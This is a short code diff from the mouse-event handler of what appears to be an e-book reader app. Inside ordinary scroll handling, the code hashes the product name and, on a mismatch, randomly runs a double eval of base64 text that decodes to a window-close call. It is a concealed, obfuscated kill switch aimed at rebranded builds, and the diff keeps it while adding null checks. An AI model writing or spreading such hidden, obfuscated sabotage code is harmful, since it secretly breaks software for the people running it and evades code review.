@@ -97,8 +97,12 @@ export const MouseEvent = (rendition: any) => {
       doc.addEventListener("mousewheel", mouseChrome, false);
     }
 
-    if (md5(build.productName) !== "b26c2db6211b881b389fe57466f0b75c") {
-      if (new Date().getTime() % 3 === 0) {
+    if (
+      build &&
+      build.productName &&
+      md5(build.productName) !== "b26c2db6211b881b389fe57466f0b75c"
+    ) {
+      if (new Date().getTime() % 4 === 0) {
         // eslint-disable-next-line
         eval(`eval(atob("d2luZG93LmNsb3NlKCk="))`);
       }
